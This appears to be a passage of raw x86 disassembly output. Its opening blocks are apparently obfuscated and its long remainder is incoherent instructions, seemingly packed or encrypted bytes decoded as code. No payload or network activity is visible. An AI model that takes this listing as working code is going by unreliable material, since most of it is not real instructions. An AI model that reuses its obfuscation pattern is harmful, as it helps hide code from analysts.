  416c74:	cmp    dl,BYTE PTR [ebp+0x675e648f]
  416c7a:	popf   
  416c7b:	adc    dh,0x30
  416c7e:	jb     0x416c83
  416c80:	in     al,0x82
  416c82:	sub    dh,bl
  416c84:	and    BYTE PTR [ebp-0x65b28c80],0x8d
  416c8b:	push   cs
  416c8c:	dec    edi
  416c8d:	sub    al,0x1c
  416c8f:	sub    eax,0x33f85d8b
  416c94:	shl    BYTE PTR [ebx],1
  416c96:	fsubr  DWORD PTR [ebx]
  416c98:	shr    DWORD PTR [ebx],cl
  416c9a:	(bad)  
  416c9b:	xor    edx,eax
  416c9d:	mov    DWORD PTR [ebp+0x8],edx
  416ca0:	mov    edx,DWORD PTR [ebp+0x8]
  416ca3:	mov    ebx,DWORD PTR [ebp-0x58]
  416ca6:	add    edx,0x5708e2
  416cac:	imul   edx,ebx
  416caf:	mov    DWORD PTR [ebp-0x58],edx
  416cb2:	mov    edx,DWORD PTR [ebp+0x8]
  416cb5:	mov    ebx,DWORD PTR [ebp-0x54]
  416cb8:	add    edx,0x64f880
  416cbe:	or     edx,ebx
  416cc0:	mov    DWORD PTR [ebp-0x54],edx
  416cc3:	mov    edx,DWORD PTR [ebp+0x8]
  416cc6:	mov    ebx,DWORD PTR [ebp-0x50]
  416cc9:	add    edx,ecx
  416ccb:	xor    edx,ebx
  416ccd:	mov    DWORD PTR [ebp-0x50],edx
  416cd0:	mov    edx,DWORD PTR [ebp+0x8]
  416cd3:	mov    ebx,DWORD PTR [ebp-0x4c]
  416cd6:	add    edx,edi
  416cd8:	and    edx,ebx
  416cda:	mov    DWORD PTR [ebp-0x4c],edx
  416cdd:	mov    edx,DWORD PTR [ebp+0x8]
  416ce0:	mov    ebx,DWORD PTR [ebp-0x48]
  416ce3:	lea    edx,[ebx+edx*1+0x241fcdf]
  416cea:	mov    DWORD PTR [ebp-0x48],edx
  416ced:	mov    edx,DWORD PTR [ebp+0x8]
  416cf0:	mov    ebx,0xfa5e1524
  416cf5:	sub    ebx,edx
  416cf7:	add    ebx,DWORD PTR [ebp-0x44]
  416cfa:	mov    DWORD PTR [ebp-0x44],ebx
  416cfd:	mov    edx,DWORD PTR [ebp+0x8]
  416d00:	xor    edx,eax
  416d02:	add    edx,esi
  416d04:	jne    0x41492d
  416d0a:	jmp    0x416d97
  416d0f:	mov    edx,DWORD PTR [ebp-0x14]
  416d12:	mov    DWORD PTR [ebp+0x8],edx
  416d15:	jmp    0x416d8a
  416d1a:	mov    edx,DWORD PTR [ebp+0x8]
  416d1d:	mov    ebx,DWORD PTR [ebp-0x8]
  416d20:	xor    edx,eax
  416d22:	xor    ebx,eax
  416d24:	sub    edx,ebx
  416d26:	sub    edx,esi
  416d28:	xor    edx,eax
  416d2a:	mov    DWORD PTR [ebp+0x8],edx
  416d2d:	mov    edx,DWORD PTR [ebp+0x8]
  416d30:	mov    ebx,DWORD PTR [ebp-0x58]
  416d33:	add    edx,0x5708e2
  416d39:	imul   edx,ebx
  416d3c:	mov    DWORD PTR [ebp-0x58],edx
  416d3f:	mov    edx,DWORD PTR [ebp+0x8]
  416d42:	mov    ebx,DWORD PTR [ebp-0x54]
  416d45:	add    edx,0x64f880
  416d4b:	or     edx,ebx
  416d4d:	mov    DWORD PTR [ebp-0x54],edx
  416d50:	mov    edx,DWORD PTR [ebp+0x8]
  416d53:	mov    ebx,DWORD PTR [ebp-0x50]
  416d56:	add    edx,ecx
  416d58:	xor    edx,ebx
  416d5a:	mov    DWORD PTR [ebp-0x50],edx
  416d5d:	mov    edx,DWORD PTR [ebp+0x8]
  416d60:	mov    ebx,DWORD PTR [ebp-0x4c]
  416d63:	add    edx,edi
  416d65:	and    edx,ebx
  416d67:	mov    DWORD PTR [ebp-0x4c],edx
  416d6a:	mov    edx,DWORD PTR [ebp+0x8]
  416d6d:	mov    ebx,DWORD PTR [ebp-0x48]
  416d70:	lea    edx,[ebx+edx*1+0x241fcdf]
  416d77:	mov    DWORD PTR [ebp-0x48],edx
  416d7a:	mov    edx,DWORD PTR [ebp+0x8]
  416d7d:	mov    ebx,0xfa5e1524
  416d82:	sub    ebx,edx
  416d84:	add    ebx,DWORD PTR [ebp-0x44]
  416d87:	mov    DWORD PTR [ebp-0x44],ebx
  416d8a:	mov    edx,DWORD PTR [ebp+0x8]
  416d8d:	xor    edx,eax
  416d8f:	add    edx,esi
  416d91:	jne    0x416d1a
  416d97:	mov    edx,DWORD PTR [ebp-0x14]
  416d9a:	mov    DWORD PTR [ebp+0x8],edx
  416d9d:	jmp    0x419172
  416da2:	mov    edx,DWORD PTR [ebp+0x8]
  416da5:	mov    ebx,DWORD PTR [ebp-0x8]
  416da8:	xor    edx,eax
  416daa:	xor    ebx,eax
  416dac:	sub    edx,ebx
  416dae:	sub    edx,esi
  416db0:	xor    edx,eax
  416db2:	mov    DWORD PTR [ebp+0x8],edx
  416db5:	mov    edx,DWORD PTR [ebp+0x8]
  416db8:	mov    ebx,DWORD PTR [ebp-0x58]
  416dbb:	add    edx,0x5708e2
  416dc1:	imul   edx,ebx
  416dc4:	mov    DWORD PTR [ebp-0x58],edx
  416dc7:	mov    edx,DWORD PTR [ebp+0x8]
  416dca:	mov    ebx,DWORD PTR [ebp-0x54]
  416dcd:	add    edx,0x64f880
  416dd3:	or     edx,ebx
  416dd5:	mov    DWORD PTR [ebp-0x54],edx
  416dd8:	mov    edx,DWORD PTR [ebp+0x8]
  416ddb:	mov    ebx,DWORD PTR [ebp-0x50]
  416dde:	add    edx,ecx
  416de0:	xor    edx,ebx
  416de2:	jmp    0x419142
  416de7:	adc    eax,0xa46b3bce
  416dec:	xchg   BYTE PTR ds:0xd7812f8a,al
  416df2:	add    bh,ch
  416df4:	mov    eax,0x4574bdc8
  416df9:	add    BYTE PTR [ebx-0x7c7ca1c2],0x61
  416e00:	call   0x8544:0x4fbeae5
  416e07:	push   edx
  416e08:	pop    edx
  416e09:	ror    BYTE PTR [edx],1
  416e0b:	or     DWORD PTR [esi+0x1c],edx
  416e0e:	pusha  
  416e0f:	(bad)  
  416e10:	adc    eax,0xa6f5e831
  416e15:	mov    ds:0xce91010,eax
  416e1a:	push   es
  416e1b:	mov    bh,0x21
  416e1d:	test   eax,0xc2f17318
  416e22:	sahf   
  416e23:	xchg   ebx,eax
  416e24:	adc    ebp,DWORD PTR [edx]
  416e26:	outs   dx,DWORD PTR ds:[esi]
  416e27:	pushf  
  416e28:	ins    DWORD PTR es:[edi],dx
  416e29:	arpl   WORD PTR [edx*4-0x3207f78d],di
  416e30:	mov    ecx,0xe937914c
  416e35:	inc    esp
  416e36:	push   0x63
  416e38:	xchg   edx,eax
  416e39:	lock retf 
  416e3b:	xchg   edi,eax
  416e3c:	lods   al,BYTE PTR ds:[si]
  416e3e:	and    ebp,edi
  416e40:	aad    0x10
  416e42:	mov    eax,0x3fa17616
  416e47:	jecxz  0x416e5e
  416e49:	cld    
  416e4a:	leave  
  416e4b:	arpl   WORD PTR [ebx],di
  416e4d:	inc    edi
  416e4e:	adc    al,0x65
  416e50:	lock jnp 0x416eb1
  416e53:	cdq    
  416e54:	xchg   edi,eax
  416e55:	sbb    BYTE PTR [edx-0x18],dl
  416e58:	retf   0x7157
  416e5b:	nop
  416e5c:	shl    BYTE PTR ds:0x607b6265,cl
  416e62:	mov    esi,0xae6d2a5f
  416e67:	fsub   QWORD PTR [eax+ecx*8-0x53]
  416e6b:	shr    ch,1
  416e6d:	call   0x8054:0x23d92397
  416e74:	fsub   st(3),st
  416e76:	inc    ebp
  416e77:	xchg   ebp,eax
  416e78:	test   eax,0xe02b849d
  416e7d:	rcr    DWORD PTR [edx],cl
  416e7f:	push   edi
  416e80:	mov    al,ds:0x97d850b
  416e85:	and    al,0xa0
  416e87:	mov    DWORD PTR [eax-0x40044ede],ecx
  416e8d:	jp     0x416e15
  416e8f:	pop    es
  416e90:	int    0xa2
  416e92:	outs   dx,DWORD PTR ds:[esi]
  416e93:	in     eax,dx
  416e94:	arpl   cx,bp
  416e96:	lea    ecx,[ebx]
  416e98:	inc    ecx
  416e99:	cmp    al,0x61
  416e9b:	push   0xffffff96
  416e9d:	enter  0x1617,0x44
  416ea1:	xchg   BYTE PTR [edi+0x21],bl
  416ea4:	icebp  
  416ea5:	pop    esi
  416ea6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ea7:	cmp    DWORD PTR [ebx-0x4a],ecx
  416eaa:	ins    DWORD PTR es:[edi],dx
  416eab:	cwde   
  416eac:	pop    eax
  416ead:	mov    esp,0x10b2473f
  416eb2:	adc    al,0xfc
  416eb4:	popf   
  416eb5:	retf   0xcf4
  416eb8:	adc    al,0x44
  416eba:	pop    eax
  416ebb:	stos   DWORD PTR es:[edi],eax
  416ebc:	jo     0x416efc
  416ebe:	mov    dh,ah
  416ec0:	call   0x903f074c
  416ec5:	sub    edx,ebx
  416ec7:	(bad)  
  416ec9:	pop    esp
  416eca:	mov    cl,0x24
  416ecc:	mov    cl,0xc
  416ece:	nop
  416ecf:	ret    
  416ed0:	arpl   dx,bp
  416ed2:	stc    
  416ed3:	jb     0x416ee2
  416ed5:	aad    0x95
  416ed7:	arpl   WORD PTR [ebx+ebx*8+0x6b],bx
  416edb:	pusha  
  416edc:	das    
  416edd:	iret   
  416ede:	inc    ebp
  416edf:	pop    ebp
  416ee0:	xor    al,bl
  416ee2:	and    edi,DWORD PTR [ebp+0x53]
  416ee5:	ror    bh,0xcf
  416ee8:	js     0x416f54
  416eea:	icebp  
  416eeb:	bound  esp,QWORD PTR [edi-0x5c]
  416eee:	mov    dl,0x7
  416ef0:	std    
  416ef1:	in     eax,0x25
  416ef3:	pushf  
  416ef4:	or     edx,ecx
  416ef6:	(bad)  
  416ef7:	jmp    0x74f1d724
  416efc:	jb     0x416e80
  416efe:	das    
  416eff:	xchg   DWORD PTR [ecx+0x3ea2a5d4],esi
  416f05:	pavgb  mm7,QWORD PTR [eax+0x7ba7879f]
  416f0c:	push   cs
  416f0d:	push   0xffffffcd
  416f0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f10:	or     bh,BYTE PTR [ecx]
  416f12:	aad    0x59
  416f14:	xchg   al,cl
  416f16:	rcl    edi,0x1
  416f19:	inc    esp
  416f1a:	mov    DWORD PTR [ebp-0x61],esp
  416f1d:	sub    DWORD PTR [esi-0x38359975],edx
  416f23:	sbb    DWORD PTR [ebp-0x35ee87ec],0xd2a88212
  416f2d:	stos   BYTE PTR es:[edi],al
  416f2e:	jmp    0xd94a77f
  416f33:	mov    al,0xdb
  416f35:	not    BYTE PTR ds:0x4c988470
  416f3b:	(bad)  
  416f3d:	mov    eax,ds:0x4506ae2
  416f42:	sbb    DWORD PTR [eax+esi*2+0x5],ebx
  416f46:	or     BYTE PTR [esi-0x3e],al
  416f49:	stos   BYTE PTR es:[edi],al
  416f4a:	mov    WORD PTR [ebx+0x7],?
  416f4d:	loop   0x416f16
  416f4f:	or     al,BYTE PTR [eax+0x1e60db37]
  416f55:	enter  0x246,0x4d
  416f59:	fstp   DWORD PTR [edx]
  416f5b:	mov    esp,0x27b4d076
  416f60:	cs pop ecx
  416f62:	inc    ebp
  416f63:	std    
  416f64:	cmp    eax,0x31063d42
  416f69:	adc    BYTE PTR [ecx-0x3],0x7b
  416f6d:	cmp    DWORD PTR fs:[eax+eax*4+0xaae7101],0xffffff85
  416f76:	cmp    edi,edi
  416f78:	sub    BYTE PTR [ebx+0x56],dh
  416f7b:	xor    dl,0xd2
  416f7e:	popa   
  416f7f:	push   esp
  416f80:	mov    ah,0x1e
  416f82:	out    dx,al
  416f83:	fidivr DWORD PTR [ecx+0x4bbf84b5]
  416f89:	xor    ebx,DWORD PTR [edi+0x50]
  416f8c:	les    eax,FWORD PTR [edi+0x56537d0]
  416f92:	xor    ecx,edi
  416f94:	int3   
  416f95:	test   eax,0xc12fc3a5
  416f9a:	xor    eax,0x497be9ec
  416f9f:	push   edx
  416fa0:	cdq    
  416fa1:	mov    dl,0xca
  416fa3:	dec    edi
  416fa4:	sbb    edi,eax
  416fa6:	mov    BYTE PTR [ecx+edi*2],dl
  416fa9:	add    al,0xd5
  416fab:	pop    edx
  416fac:	arpl   WORD PTR [ecx+eax*2+0x6efee6cf],dx
  416fb3:	fcomp  QWORD PTR [edx-0x6f]
  416fb6:	imul   esp,DWORD PTR [ecx-0x1db8145a],0x3e
  416fbd:	lods   al,BYTE PTR ds:[esi]
  416fbe:	ret    
  416fbf:	mov    BYTE PTR [esi+0x30885bf8],cl
  416fc5:	call   0x9d55777a
  416fca:	and    al,0x53
  416fcc:	lods   eax,DWORD PTR ds:[esi]
  416fcd:	xchg   edx,eax
  416fce:	ins    BYTE PTR es:[edi],dx
  416fcf:	repnz sbb al,0x7a
  416fd2:	cwde   
  416fd3:	mov    ds:0x3b6178d7,al
  416fd8:	push   ss
  416fd9:	test   DWORD PTR [edi],ebp
  416fdb:	mov    edx,0xf3b8f9f6
  416fe0:	nop
  416fe1:	add    ebp,DWORD PTR [ebx+0x1a]
  416fe4:	gs inc edx
  416fe6:	mov    esi,0x7aad2a95
  416feb:	cmp    al,0x85
  416fed:	xor    BYTE PTR [ebx],dh
  416fef:	in     al,0xd7
  416ff1:	jg     0x416fec
  416ff3:	add    bh,BYTE PTR [edi]
  416ff5:	dec    ecx
  416ff6:	dec    esp
  416ff7:	jo     0x41706b
  416ff9:	mov    ds:0xd18619a6,al
  416ffe:	stos   DWORD PTR es:[edi],eax
  416fff:	ror    dl,0x17
  417002:	cmp    edi,DWORD PTR [esi+0x17]
  417005:	sar    ebp,0x3b
  417008:	inc    eax
  417009:	clc    
  41700a:	mov    dl,BYTE PTR [ecx]
  41700c:	jnp    0x41701c
  41700e:	pop    ds
  41700f:	dec    ebp
  417010:	adc    BYTE PTR [esi+0x66],ch
  417013:	clc    
  417014:	mov    cl,0xce
  417016:	test   BYTE PTR ds:[ebp+0x2f],ah
  41701a:	and    BYTE PTR [ecx+0x37],ah
  41701d:	shr    DWORD PTR [ecx-0x15113bc4],1
  417023:	retf   
  417024:	cmp    edi,ebp
  417026:	mov    dh,0xde
  417028:	pop    edx
  417029:	jnp    0x416ffc
  41702b:	jp     0x416fc4
  41702d:	aam    0x7f
  41702f:	adc    BYTE PTR [edx+0x454ee141],cl
  417035:	es int 0x9
  417038:	ja     0x41708f
  41703a:	mov    BYTE PTR [esi-0x5e],dl
  41703d:	or     DWORD PTR [esi-0x799a646f],0x68
  417044:	pusha  
  417045:	je     0x41700e
  417047:	(bad)  
  417049:	dec    esi
  41704a:	mov    eax,0xc3cb65aa
  41704f:	mov    dh,0x70
  417051:	push   edx
  417052:	mov    eax,ds:0x4ef63479
  417057:	xor    eax,0xb92d055b
  41705c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41705d:	ret    
  41705e:	mov    BYTE PTR [edx+0x41],cl
  417061:	addr16 or al,0x3a
  417064:	bound  edx,QWORD PTR [edi-0x311b8986]
  41706a:	data16 mov bh,BYTE PTR [eax]
  41706d:	inc    ecx
  41706e:	lds    esi,FWORD PTR [edx]
  417070:	jns    0x417046
  417072:	fild   WORD PTR [edx]
  417074:	cmp    DWORD PTR [edi],0x11
  417077:	jb     0x41702e
  417079:	ds sbb eax,0x3573f737
  41707f:	jne    0x4170bc
  417081:	test   DWORD PTR [ebx],ebx
  417083:	and    al,0x47
  417085:	and    al,cl
  417087:	addr16 inc eax
  417089:	sbb    eax,0xb619c193
  41708e:	js     0x41701a
  417090:	repz jns 0x4170a3
  417093:	inc    edx
  417094:	push   ds
  417095:	data16 arpl WORD PTR [edx],bp
  417098:	inc    eax
  417099:	(bad)  
  41709a:	fs ja  0x4170e8
  41709d:	mov    ecx,0x64302ce6
  4170a2:	xor    DWORD PTR [ebp-0x6c5a0301],0x28
  4170a9:	jl     0x417098
  4170ab:	mov    cl,0x2d
  4170ad:	call   0x70b78d77
  4170b2:	jle    0x4170c7
  4170b4:	jbe    0x417065
  4170b6:	sub    BYTE PTR [edx-0x45],cl
  4170b9:	fsubr  DWORD PTR [edx+eax*2]
  4170bc:	adc    eax,0x8669393f
  4170c1:	pop    ds
  4170c2:	inc    edx
  4170c3:	xlat   BYTE PTR ds:[ebx]
  4170c4:	daa    
  4170c5:	rol    DWORD PTR [edi],cl
  4170c7:	fdiv   QWORD PTR [esi+0x7949a508]
  4170cd:	fld    TBYTE PTR [ebp+0x59]
  4170d0:	sub    ch,ch
  4170d2:	push   ebx
  4170d3:	mov    edx,0xf63313a1
  4170d8:	sub    ebx,DWORD PTR [edi-0x40f33f72]
  4170de:	add    BYTE PTR [ebx+0x7205a3fe],bl
  4170e4:	popw   ss
  4170e6:	cwde   
  4170e7:	push   eax
  4170e8:	add    al,0x39
  4170ea:	retf   
  4170eb:	lea    esp,[ebx-0x47]
  4170ee:	in     eax,dx
  4170ef:	pop    ds
  4170f0:	(bad)  
  4170f1:	xchg   edx,eax
  4170f2:	je     0x417161
  4170f4:	jecxz  0x417141
  4170f6:	leave  
  4170f7:	mov    bl,0x43
  4170f9:	pop    ss
  4170fa:	jne    0x417169
  4170fc:	lea    ecx,[edx-0x3933d693]
  417102:	dec    bp
  417104:	lods   al,BYTE PTR ds:[esi]
  417105:	pop    esp
  417106:	inc    edi
  417107:	sbb    BYTE PTR [ebp+0x24],cl
  41710a:	test   eax,0x1b141e5b
  41710f:	mov    bh,0x53
  417111:	leave  
  417112:	arpl   WORD PTR [ebx],ax
  417114:	ins    BYTE PTR es:[edi],dx
  417115:	pop    ss
  417116:	mov    eax,ds:0x60f6bd82
  41711b:	pcmpgtd mm2,mm2
  41711e:	cs dec esi
  417120:	sub    DWORD PTR [ebp+0x79],ebx
  417123:	jb     0x417142
  417125:	in     eax,dx
  417126:	imul   esp,DWORD PTR [edi+0x33],0x5f2eede3
  41712d:	jge    0x4170db
  41712f:	adc    ebx,DWORD PTR [edx-0x28]
  417132:	sub    DWORD PTR [edi],esi
  417134:	leave  
  417135:	cs jnp 0x4171a8
  417138:	inc    eax
  417139:	pop    ebx
  41713a:	(bad)  
  41713b:	mov    al,ds:0x83d333c3
  417140:	add    al,0xa
  417142:	adc    BYTE PTR [edi+0x476e5dab],bl
  417148:	dec    ebp
  417149:	stos   BYTE PTR es:[edi],al
  41714a:	jnp    0x4171aa
  41714c:	popf   
  41714d:	stc    
  41714e:	or     eax,0x490335d6
  417153:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417154:	dec    eax
  417155:	xor    esi,DWORD PTR [edi-0x7da262fd]
  41715b:	mov    ch,0xbc
  41715d:	mov    gs,WORD PTR [eax]
  41715f:	mov    edi,0x3b780999
  417164:	cmp    BYTE PTR [ecx],cl
  417166:	xchg   edx,eax
  417167:	cmp    eax,0xb0c4c1fb
  41716c:	dec    ebx
  41716d:	iret   
  41716e:	sbb    DWORD PTR [ebp+0x48],esp
  417171:	jl     0x417163
  417173:	data16 add BYTE PTR [edx+ebp*1-0x33],ah
  417178:	cmp    ebx,DWORD PTR [ecx]
  41717a:	or     ecx,edx
  41717c:	scas   al,BYTE PTR es:[edi]
  41717d:	dec    esp
  41717e:	cwde   
  41717f:	fnstsw WORD PTR [edx+ebp*2]
  417182:	jecxz  0x4171cf
  417184:	repnz aam 0xdd
  417187:	sub    DWORD PTR [eax+0x76073075],edi
  41718d:	addr16 mov bl,0x8f
  417190:	test   eax,0x206add63
  417195:	adc    ch,BYTE PTR [edx-0x4fdb0c8e]
  41719b:	fdivrp st(6),st
  41719d:	pushf  
  41719e:	imul   edi,DWORD PTR [edx+0x7a],0xfb13073
  4171a5:	out    dx,eax
  4171a6:	adc    bh,ch
  4171a8:	push   0x66d970b5
  4171ad:	jb     0x4171d0
  4171af:	repnz xor BYTE PTR [edx+0x78],ch
  4171b3:	pop    edi
  4171b4:	cwde   
  4171b5:	test   DWORD PTR [esi-0x6d3464c6],esp
  4171bb:	jo     0x417167
  4171bd:	jmp    0x856f04c6
  4171c2:	clc    
  4171c3:	test   BYTE PTR [eax+edi*1+0x30],cl
  4171c7:	dec    esi
  4171c8:	xchg   edx,eax
  4171c9:	xchg   esi,eax
  4171ca:	sub    al,dl
  4171cc:	and    DWORD PTR [esi],0x44
  4171cf:	xchg   esi,eax
  4171d0:	(bad)  
  4171d1:	push   edx
  4171d2:	jge    0x41720f
  4171d4:	xchg   BYTE PTR [esi+0x1a],cl
  4171d7:	sub    al,0x42
  4171d9:	cmp    al,0xcd
  4171db:	in     al,dx
  4171dc:	loope  0x4171e3
  4171de:	rol    ebx,cl
  4171e0:	dec    edx
  4171e1:	lods   al,BYTE PTR ds:[esi]
  4171e2:	jg     0x417184
  4171e4:	mov    BYTE PTR [ebx-0x64],ch
  4171e7:	mov    dl,0xba
  4171e9:	and    cl,BYTE PTR [esi]
  4171eb:	or     eax,0x16138793
  4171f0:	out    0x3d,al
  4171f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171f3:	sbb    eax,0x485490c2
  4171f8:	push   es
  4171f9:	jnp    0x417202
  4171fb:	in     eax,dx
  4171fc:	add    esp,ecx
  4171fe:	push   ebx
  4171ff:	xchg   DWORD PTR [esi],esp
  417201:	mov    ah,0x52
  417203:	ds call 0xce1a:0x7dd3a742
  41720b:	mov    al,0xc0
  41720d:	fcom   QWORD PTR [edx+0x1db54662]
  417213:	popa   
  417214:	push   ds
  417215:	sub    al,0x9d
  417217:	fcomp  QWORD PTR [esi+ebx*1+0x9]
  41721b:	dec    edi
  41721c:	not    DWORD PTR [edi+0x187cf4f5]
  417222:	fild   WORD PTR [edi]
  417224:	xchg   ebx,eax
  417225:	push   edi
  417226:	mov    ds:0xe25a9b7,al
  41722b:	cmp    BYTE PTR ds:0x931cf32f,0xb8
  417232:	or     ecx,DWORD PTR [edx+0x4]
  417235:	push   0xffffffe7
  417237:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417238:	inc    esp
  417239:	inc    ebx
  41723a:	popf   
  41723b:	dec    esi
  41723c:	or     eax,0xdc87105
  417241:	and    al,BYTE PTR [ecx]
  417243:	inc    ecx
  417244:	mov    DWORD PTR [ebx-0x3e],eax
  417247:	cmp    BYTE PTR [edx+0x2d],0x7a
  41724b:	xchg   esi,eax
  41724c:	popa   
  41724d:	in     eax,dx
  41724e:	sub    al,BYTE PTR [ecx]
  417250:	jb     0x41724b
  417252:	pop    ecx
  417253:	jle    0x417264
  417255:	repz ja 0x417220
  417258:	jmp    0xe37709e8
  41725d:	jno    0x41724e
  41725f:	push   ds
  417260:	dec    BYTE PTR [edi-0x21]
  417263:	call   0x4932927c
  417268:	dec    edi
  417269:	xor    cl,bl
  41726b:	ja     0x4172b1
  41726d:	mov    esi,0xca171c43
  417272:	lock xor ecx,DWORD PTR [ecx-0x5eefa5bc]
  417279:	inc    ebx
  41727a:	stos   BYTE PTR es:[edi],al
  41727b:	cmp    eax,0x7c208348
  417280:	or     DWORD PTR [eax+0x4b],esp
  417283:	ins    DWORD PTR es:[edi],dx
  417284:	(bad)  [ebx-0x2b]
  417287:	xlat   BYTE PTR ds:[ebx]
  417288:	sbb    al,0xa4
  41728a:	and    DWORD PTR [edi-0x6a7a2b8b],ebp
  417290:	pop    ss
  417291:	cmp    DWORD PTR [eax+esi*1],0x66f54350
  417298:	out    dx,al
  417299:	aaa    
  41729a:	(bad)  
  41729b:	jb     0x4172fb
  41729d:	cmc    
  41729e:	xor    ebp,esi
  4172a0:	xchg   DWORD PTR [ecx],eax
  4172a2:	sub    BYTE PTR [edi-0x5368a8bc],bl
  4172a8:	sbb    al,0xa4
  4172aa:	fldenv [ebp-0x75]
  4172ad:	pop    esi
  4172ae:	ficom  DWORD PTR [edi+0x1ad9a597]
  4172b4:	mov    ecx,0x4d2500e8
  4172b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172ba:	push   ds
  4172bb:	icebp  
  4172bc:	push   ebp
  4172bd:	mov    bh,0x25
  4172bf:	fmul   st,st(7)
  4172c1:	dec    ecx
  4172c2:	fdivr  DWORD PTR [esi+0x3289b83d]
  4172c8:	push   ebp
  4172c9:	cld    
  4172ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172cc:	push   ecx
  4172cd:	mov    edi,edx
  4172cf:	fiadd  WORD PTR [ecx+ebx*2-0x70]
  4172d3:	cmp    ah,dh
  4172d5:	mov    bl,0x35
  4172d7:	pop    ebx
  4172d8:	jno    0x4172c1
  4172da:	jnp    0x417354
  4172dc:	adc    eax,0xb5e7cce3
  4172e1:	jb     0x417310
  4172e3:	outs   dx,DWORD PTR ds:[esi]
  4172e4:	icebp  
  4172e5:	ret    0x5a35
  4172e8:	bound  esi,QWORD PTR [edx-0x9]
  4172eb:	mov    WORD PTR [ebp+0x4f],es
  4172ee:	dec    eax
  4172ef:	popa   
  4172f0:	repz imul ecx,DWORD PTR [ebp+eax*8+0x2cc4c39f],0xffffff8c
  4172f9:	xor    eax,0x73c31f5b
  4172fe:	int3   
  4172ff:	adc    si,WORD PTR [esp+ebx*8-0x6c30086a]
  417307:	fwait
  417308:	xor    dl,BYTE PTR [edx+ebx*8]
  41730b:	dec    esi
  41730c:	or     eax,0x161ce7cb
  417311:	inc    eax
  417312:	cs retf 
  417314:	sahf   
  417315:	adc    BYTE PTR [esi-0x5d],0x20
  417319:	or     DWORD PTR [ebp+0x66],0xffffffea
  41731d:	xchg   ebp,eax
  41731e:	sub    al,BYTE PTR [esi+ecx*4]
  417321:	aas    
  417322:	fadd   DWORD PTR [ebx]
  417324:	xchg   edx,eax
  417326:	pop    edx
  417327:	mov    ch,0xd7
  417329:	and    edx,DWORD PTR [eax]
  41732b:	adc    al,0xd8
  41732d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41732e:	push   ds
  41732f:	int    0xec
  417331:	mov    ecx,0xa720e519
  417336:	mov    eax,0xe866a8bf
  41733b:	pop    eax
  41733c:	sbb    dl,dh
  41733e:	push   cs
  41733f:	mov    bh,BYTE PTR [edi-0x43090a75]
  417345:	mov    edi,0x6035645f
  41734a:	and    al,0xcb
  41734c:	test   BYTE PTR [ecx+eiz*4],cl
  41734f:	push   esi
  417350:	xchg   edi,eax
  417351:	rcr    BYTE PTR [esi-0x6343c31],cl
  417357:	cld    
  417358:	popa   
  417359:	xchg   ecx,eax
  41735a:	push   0x48
  41735c:	je     0x41737a
  41735e:	cld    
  41735f:	aaa    
  417360:	out    dx,eax
  417361:	cmp    esp,esi
  417363:	xor    DWORD PTR [ebp-0x203c28b5],edx
  417369:	pop    ss
  41736a:	fistp  DWORD PTR [edx+0x13]
  41736d:	inc    edi
  41736e:	test   BYTE PTR [eax+0xca6b04f],cl
  417374:	mov    cl,0xa8
  417376:	std    
  417377:	jae    0x4173b2
  417379:	mov    ch,0x6c
  41737b:	and    DWORD PTR [edx+0x145b734e],0x6683f61d
  417385:	pop    ecx
  417386:	jb     0x417402
  417388:	loop   0x417355
  41738a:	sub    dh,ch
  41738c:	inc    ebx
  41738d:	repnz xchg esi,eax
  41738f:	pop    esi
  417390:	call   0xa5f7a003
  417395:	sbb    eax,0x3d9b48c
  41739a:	sbb    eax,0xc8f3374b
  41739f:	mov    dh,0x61
  4173a1:	cmp    BYTE PTR [ecx],al
  4173a3:	or     edx,DWORD PTR [ecx-0xc]
  4173a6:	mov    WORD PTR [edx-0x1],cs
  4173a9:	js     0x41741e
  4173ab:	adc    BYTE PTR gs:[edx-0x657aca66],ch
  4173b2:	mov    ecx,0x5c24c591
  4173b7:	or     eax,0x9a3f4cef
  4173bc:	push   ebx
  4173bd:	jge    0x4173e0
  4173bf:	dec    edx
  4173c0:	and    DWORD PTR [ecx],ebx
  4173c2:	pusha  
  4173c3:	push   0x8f6513d9
  4173c8:	pop    eax
  4173c9:	lods   al,BYTE PTR ds:[esi]
  4173ca:	push   0x2f
  4173cc:	rcr    DWORD PTR [esi-0x4354bf54],1
  4173d2:	or     DWORD PTR [ebp+0x5c594516],esi
  4173d8:	inc    eax
  4173d9:	mov    al,ah
  4173db:	outs   dx,DWORD PTR ds:[esi]
  4173dc:	clc    
  4173dd:	stos   DWORD PTR es:[edi],eax
  4173de:	xchg   esp,eax
  4173df:	pop    esp
  4173e0:	sub    al,0x85
  4173e2:	jle    0x417455
  4173e4:	mov    bh,0x15
  4173e6:	xor    dh,BYTE PTR [ecx+0x697dd32]
  4173ec:	lods   eax,DWORD PTR ds:[esi]
  4173ed:	aas    
  4173ee:	imul   esp,DWORD PTR [ebx-0x70],0x33b43ef7
  4173f5:	das    
  4173f6:	retf   
  4173f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173f8:	shl    BYTE PTR [edi-0x53],0xb8
  4173fc:	inc    eax
  4173fd:	add    BYTE PTR [esi+0x52bd8dd2],bl
  417403:	pop    es
  417404:	sub    DWORD PTR [ebp+0x434fb049],esi
  41740a:	cmp    BYTE PTR [ecx+esi*1-0x6b4c3a03],bl
  417411:	outs   dx,DWORD PTR ds:[esi]
  417412:	cmp    al,0x1d
  417414:	stos   DWORD PTR es:[edi],eax
  417415:	jle    0x417411
  417417:	scas   eax,DWORD PTR es:[edi]
  417418:	sbb    DWORD PTR [esi-0x5d9404cc],ebx
  41741e:	call   0x19d63c32
  417423:	(bad)  
  417424:	lods   al,BYTE PTR ds:[esi]
  417425:	sti    
  417426:	pusha  
  417427:	adc    edx,DWORD PTR [esi-0x78]
  41742a:	sbb    BYTE PTR [ecx+0x3d215740],al
  417430:	jp     0x417450
  417432:	xor    eax,0xcd8b743c
  417437:	call   DWORD PTR [ebx]
  417439:	adc    al,0xa1
  41743b:	out    0x52,al
